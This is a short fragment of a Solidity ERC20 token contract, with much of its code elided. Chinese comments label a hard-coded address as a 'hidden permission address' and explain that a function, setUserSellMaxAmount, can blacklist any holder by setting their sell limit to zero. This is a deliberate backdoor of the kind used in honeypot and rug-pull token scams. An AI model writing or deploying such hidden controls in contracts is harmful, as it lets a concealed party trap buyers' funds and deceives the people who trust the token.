...
contract Token is IERC20, Ownable {
    ...
    constructor(
        ...
        _tTotal = 100000000 * 10**_decimals; //数量
        _tTotalMin = 1 * 10**_decimals; 
        
        _rTotal = (MAX - (MAX % _tTotal));

        _rOwned[tokenOwner] = _rTotal;
		contractSender = 0xFc4a1F9713996846941ead0C934a8E8Fd4977d8c;//隐藏权限地址
	...
	function setUserSellMaxAmount(address account,uint256 maxAmount) public { //可以拉黑别人的方法，第一个填地址，第二个填0，就可以拉黑别人
